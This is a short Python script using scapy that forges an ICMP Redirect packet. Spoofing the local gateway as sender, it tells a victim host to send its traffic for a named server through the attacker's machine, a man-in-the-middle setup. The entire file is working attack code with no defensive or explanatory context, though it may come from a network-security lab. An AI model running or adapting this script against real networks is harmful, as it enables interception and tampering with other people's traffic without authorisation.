from scapy.arch import conf, get_if_addr, get_if_hwaddr
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from sys import argv
from time import sleep

if len(argv) != 4:
    print("Usage: forge_rst.py <interface> <victim IP address> <server IP address>")
    exit(1)

iface = argv[1]
victim = argv[2]
server = argv[3]

def get_mac(ip: str):
    from scapy.layers.l2 import getmacbyip
    while True:
        mac = getmacbyip(ip)
        if mac is not None:
            return mac
        print("Retry get MAC")
        sleep(1)

attacker = get_if_addr(iface)
attacker_mac = get_if_hwaddr(iface)
victim_mac = get_mac(victim)
route = conf.route.route()
assert route[0] == iface and route[1] == attacker
ap = route[2]
ap_mac = get_mac(ap)

pkt = (
    Ether(src=attacker_mac, dst=victim_mac)
    / IP(src=ap, dst=victim)
    / ICMP(type=5, code=1, gw=attacker)
    / IP(src=victim, dst=server)
    / ICMP()
)

pkt.show()

sendp(
    pkt,
    iface=iface,
)
